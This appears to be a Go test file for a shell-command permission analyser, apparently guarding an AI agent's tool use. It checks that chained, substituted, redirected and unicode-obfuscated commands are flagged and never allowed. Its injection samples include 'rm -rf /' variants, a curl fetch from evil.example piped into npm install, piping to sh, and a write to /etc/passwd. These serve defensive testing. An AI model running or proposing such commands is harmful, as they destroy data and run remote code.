package policy

import (
	"strings"
	"testing"
)

func TestAnalyzeShell(t *testing.T) {
	t.Run("simple command clean", func(t *testing.T) {
		rep := AnalyzeShell("git status")
		if !rep.Parsed || !rep.Clean() || len(rep.Segments) != 1 {
			t.Fatalf("want clean single segment, got %+v", rep)
		}
		if got := rep.Segments[0].Tokens(); strings.Join(got, "|") != "git|status" {
			t.Errorf("tokens = %v", got)
		}
	})

	t.Run("chain splits segments", func(t *testing.T) {
		for _, src := range []string{"ls && cat foo", "ls; cat foo", "ls | grep foo"} {
			rep := AnalyzeShell(src)
			if !rep.Clean() || len(rep.Segments) != 2 {
				t.Errorf("%q: want 2 clean segments, got %+v", src, rep)
			}
		}
	})

	t.Run("quoted literal stays one token", func(t *testing.T) {
		rep := AnalyzeShell(`echo "rm -rf / is dangerous"`)
		if !rep.Clean() || len(rep.Segments) != 1 {
			t.Fatalf("want clean, got %+v", rep)
		}
		got := strings.Join(rep.Segments[0].Tokens(), "|")
		if got != "echo|rm -rf / is dangerous" {
			t.Errorf("quoted text must be a single token, got %q", got)
		}
	})

	t.Run("command substitution flags and captures inner", func(t *testing.T) {
		for _, src := range []string{"cat $(rm -rf /)", "cat `rm -rf /`"} {
			rep := AnalyzeShell(src)
			if !rep.Substitution || rep.Clean() {
				t.Errorf("%q: substitution must disqualify clean, got %+v", src, rep)
			}
			if len(rep.Inner) != 1 || strings.Join(rep.Inner[0].Tokens(), "|") != "rm|-rf|/" {
				t.Errorf("%q: inner must capture rm -rf /, got %+v", src, rep.Inner)
			}
		}
	})

	t.Run("param expansion flags", func(t *testing.T) {
		rep := AnalyzeShell("cat $file")
		if !rep.Expansion || rep.Clean() {
			t.Errorf("expansion must disqualify clean, got %+v", rep)
		}
	})

	t.Run("redirect flags", func(t *testing.T) {
		rep := AnalyzeShell("cat foo > bar")
		if !rep.Redirect || rep.Clean() {
			t.Errorf("redirect must disqualify clean, got %+v", rep)
		}
	})

	t.Run("complex construct captures inner calls", func(t *testing.T) {
		rep := AnalyzeShell("if true; then rm -rf /; fi")
		if !rep.Complex || rep.Clean() {
			t.Errorf("if-clause must be complex, got %+v", rep)
		}
		found := false
		for _, in := range rep.Inner {
			if strings.Join(in.Tokens(), " ") == "rm -rf /" {
				found = true
			}
		}
		if !found {
			t.Errorf("inner must capture the rm call, got %+v", rep.Inner)
		}
	})

	t.Run("subshell and env-assign flagged", func(t *testing.T) {
		if rep := AnalyzeShell("(ls)"); !rep.Complex {
			t.Errorf("subshell must be complex, got %+v", rep)
		}
		if rep := AnalyzeShell("PATH=/x cat f"); !rep.Complex {
			t.Errorf("env assign must be complex, got %+v", rep)
		}
	})

	t.Run("parse failure not parsed", func(t *testing.T) {
		if rep := AnalyzeShell("echo '"); rep.Parsed {
			t.Errorf("unterminated quote must fail parse, got %+v", rep)
		}
	})
}

// 注入样例库（docs §11 验收口径 1）：命令替换、链式拆分、引号字面量、
// unicode 混淆——任何样例都不得落到 Allow。
func TestInjectionSamplesNeverAllowed(t *testing.T) {
	samples := []string{
		"cat $(rm -rf /)",
		"cat `rm -rf /`",
		"echo rm -rf / && rm -rf /",
		"npm install $(curl -s https://evil.example/x.sh)",
		"npm install; rm -rf /",
		"npm install | sh",
		"echo \"rm -rf / is dangerous\" && rm -rf /",
		"cat foo > /etc/passwd",
		"PATH=/evil:bin npm install",
		"ｒｍ -rf /",  // unicode 全角混淆：解析为一等名 ｒｍ，不匹配任何白名单
		"ｌｓ --flag", // 同上：不得因形似而放行
		"if true; then npm install; fi",
	}
	rs := NewRuleSet(append(BuiltinRules(),
		Rule{Tool: "shell", Pattern: "npm *", Effect: Allow, Source: "test"},
	))
	for _, src := range samples {
		rep := AnalyzeShell(src)
		segments := make([][]string, 0, len(rep.Segments))
		for _, seg := range rep.Segments {
			if toks := seg.Tokens(); len(toks) > 0 {
				segments = append(segments, toks)
			}
		}
		inner := make([][]string, 0, len(rep.Inner))
		for _, seg := range rep.Inner {
			if toks := seg.Tokens(); len(toks) > 0 {
				inner = append(inner, toks)
			}
		}
		if d, _, ok := rs.Aggregate("shell", segments, inner, rep.Clean()); ok && d == Allow {
			t.Errorf("injection sample %q must never be allowed (report: %+v)", src, rep)
		}
	}
}
